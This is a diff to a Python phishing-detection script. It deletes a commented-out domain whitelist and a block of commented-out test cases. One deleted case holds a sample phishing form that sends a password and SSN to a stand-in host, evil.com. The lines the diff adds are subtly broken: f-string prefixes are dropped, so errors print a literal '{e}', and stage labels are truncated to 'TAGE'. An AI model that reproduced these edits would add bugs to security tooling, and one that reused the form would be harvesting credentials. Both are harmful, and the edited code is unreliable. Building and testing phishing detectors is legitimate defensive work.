@@ -230,44 +230,11 @@ class RuleBasedFusionPredictor:
         print(f" 🔍 ANALYZING: {url}")
         print("="*70)
 
-        # # --------------------------------------------------------
-        # # 0. STRICT WHITELIST CHECK
-        # # --------------------------------------------------------
-        # # SECURITY NOTE: This performs a STRICT EXACT MATCH on the domain.
-        # # It does NOT allow "google.com.evil.com" or "instagram-login.com".
-        # # It ONLY allows the exact legitimate domain to prevent false positives for safe sites.
-        
-        # domain_check = url.lower().replace("https://", "").replace("http://", "").split("/")[0]
-        
-        # # This function checks if domain_check is EXACTLY in the legitimate_brands set
-        # if self.extractor_2025.is_legitimate_domain(domain_check):
-        #     print(f"\n🛡️  WHITELIST MATCH: {domain_check}")
-        #     print(f"   (Verified as exact match to legitimate brand)")
-            
-        #     # Auto-pass
-        #     results.update({
-        #         'url_pred': 0,
-        #         'url_prob': 0.001,
-        #         'content_pred': 0,
-        #         'content_prob': 0.001,
-        #         'final_risk_pct': 0.1,
-        #         'risk_level': "VERY SAFE",
-        #         'color': "green",
-        #         'confidence': "VERY HIGH",
-        #         'is_phishing': False,
-        #         'message': "✅ VERIFIED SAFE (Whitelisted)",
-        #         'whitelisted': True
-        #     })
-            
-        #     self._print_browser_warning(results)
-        #     return results
-
-
         # ========================================================
         # STAGE 1: Model 2024 (URL Analysis)
         # ========================================================
         try:
-            print(f"\n📍 STAGE 1: URL Pattern Analysis (Model 2024)")
+            print(" STAGE 1: URL Pattern Analysis (Model 2024)")
             print("-"*70)
             
             feats_url = self.extractor_2025.extract(url)
@@ -285,7 +252,7 @@ class RuleBasedFusionPredictor:
             print(f"   Probability: {prob_phish_2025*100:.1f}%")
             
         except Exception as e:
-            print(f"   ❌ Error: {e}")
+            print("Error: {e}")
             results['url_pred'] = 0
             results['url_prob'] = 0.5
 
@@ -294,7 +261,7 @@ class RuleBasedFusionPredictor:
         # ========================================================
         if results['html_available']:
             try:
-                print(f"\n📄 STAGE 2: Page Content Analysis (Model 2023)")
+                print("TAGE 2: Page Content Analysis (Model 2023)")
                 print("-"*70)
                 
                 feats_content = self.extractor_2023.extract_from_html(html_content, url)
@@ -312,11 +279,11 @@ class RuleBasedFusionPredictor:
                 print(f"   Probability: {prob_phish_2023*100:.1f}%")
                 
             except Exception as e:
-                print(f"   ❌ Error: {e}")
+                print("Error: {e}")
                 results['content_pred'] = 0
                 results['content_prob'] = 0.0
         else:
-            print(f"\n⚠️  STAGE 2: Skipped (No HTML Content)")
+            print("TAGE 2: Skipped (No HTML Content)")
             results['content_pred'] = 0
             results['content_prob'] = 0.0
 
@@ -398,64 +365,3 @@ if __name__ == "__main__":
     print("="*70 + "\n")
     
     predictor = RuleBasedFusionPredictor()
-    
-    # ========================================================
-    # TEST CASES (Match Your Examples)
-    # ========================================================
-    # test_cases = [
-    #     {
-    #         "name": "Example 1 - phishing website",
-    #         "url": "https://www.mazzios.com",
-    #         "html": "<html><head><title>GitHub</title></head><body><p>Code collaboration</p></body></html>",
-    #         "expected_risk": "12%",
-    #         "expected_level": "VERY SAFE"
-    #     },
-    #     {
-    #         "name": "Example 2 - GitHub Edge Case",
-    #         "url": "https://github-verify.tk",
-    #         "html": "<html><head><title>GitHub</title></head><body><p>Legitimate content</p></body></html>",
-    #         "expected_risk": "65%",
-    #         "expected_level": "POSSIBLY MALICIOUS"
-    #     },
-    #     {
-    #         "name": "Example 3 - Real Phishing",
-    #         "url": "https://paypal-secure-verify.tk",
-    #         "html": """
-    #         <html><body>
-    #             <form action="http://evil.com/steal.php">
-    #                 <input type="password" name="pass">
-    #                 <input type="hidden" name="redirect">
-    #                 <input type="text" name="ssn">
-    #             </form>
-    #         </body></html>
-    #         """,
-    #         "expected_risk": "94%",
-    #         "expected_level": "VERY SUSPICIOUS"
-    #     }
-    # ]
-    
-    # print("="*70)
-    # print(" RUNNING TEST CASES")
-    # print("="*70)
-    
-    # for i, test in enumerate(test_cases, 1):
-    #     print(f"\n{'#'*70}")
-    #     print(f"# TEST CASE {i}: {test['name']}")
-    #     print(f"# Expected: ~{test['expected_risk']} ({test['expected_level']})")
-    #     print(f"{'#'*70}")
-        
-    #     result = predictor.predict(test['url'], test['html'])
-        
-    #     print(f"\n📊 Result Summary:")
-    #     print(f"   Final Risk: {result['final_risk_pct']:.0f}%")
-    #     print(f"   Risk Level: {result['risk_level']}")
-    #     print(f"   Expected Level: {test['expected_level']}")
-        
-    #     if result['risk_level'] == test['expected_level']:
-    #         print(f"   ✅ PASS")
-    #     else:
-    #         print(f"   ⚠️  Different level (but may still be correct)")
-    
-    # print(f"\n{'='*70}")
-    # print(" ✅ ALL TESTS COMPLETE")
-    # print(f"{'='*70}\n")
